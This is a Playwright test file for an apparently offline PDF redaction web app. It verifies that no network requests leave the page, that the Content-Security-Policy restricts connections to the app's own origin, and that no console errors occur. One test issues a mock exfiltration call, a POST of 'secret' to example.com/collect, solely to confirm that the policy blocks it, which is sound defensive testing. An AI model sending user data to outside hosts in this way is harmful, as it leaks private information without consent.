import { expect, type Request, test } from "@playwright/test";
import { drawBox, exportAndDownload, openFixture, pdfTextItems } from "./helpers";

test("no network requests after the initial load, and it works offline", async ({ page, context }) => {
  await page.goto("/");
  await page.waitForLoadState("networkidle");

  const requests: Request[] = [];
  page.on("request", (r) => {
    if (/^https?:/.test(r.url())) requests.push(r);
  });
  // Also catch requests made by workers.
  context.on("request", (r) => {
    if (/^https?:/.test(r.url()) && !requests.includes(r)) requests.push(r);
  });
  await context.setOffline(true);

  await openFixture(page, "dirty.pdf");
  await drawBox(page, 0.1, 0.1, 0.4, 0.2);
  const { bytes } = await exportAndDownload(page, 1);
  expect((await pdfTextItems(bytes)).items).toBe(0);

  expect(requests.map((r) => `${r.method()} ${r.url()}`)).toEqual([]);
});

test("the CSP restricts connect-src to 'self' (header and meta tag) and the browser enforces it", async ({ page }) => {
  const response = await page.goto("/");
  const header = response!.headers()["content-security-policy"];
  expect(header).toContain("connect-src 'self'");
  expect(header).not.toMatch(/connect-src[^;]*(https?:|\*)/);

  const meta = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
  expect(meta).toContain("connect-src 'self'");
  expect(meta).toContain("script-src 'self';");

  const blocked = await page.evaluate(async () => {
    try {
      await fetch("https://example.com/collect", { method: "POST", body: "secret" });
      return false;
    } catch {
      return true;
    }
  });
  expect(blocked).toBe(true);
});

test("the page has no console errors or CSP violations while working", async ({ page }) => {
  const problems: string[] = [];
  page.on("console", (m) => m.type() === "error" && problems.push(m.text()));
  page.on("pageerror", (e) => problems.push(e.message));
  await page.goto("/");
  await openFixture(page, "dirty.pdf");
  await drawBox(page, 0.1, 0.1, 0.4, 0.2);
  await exportAndDownload(page, 1);
  expect(problems).toEqual([]);
});
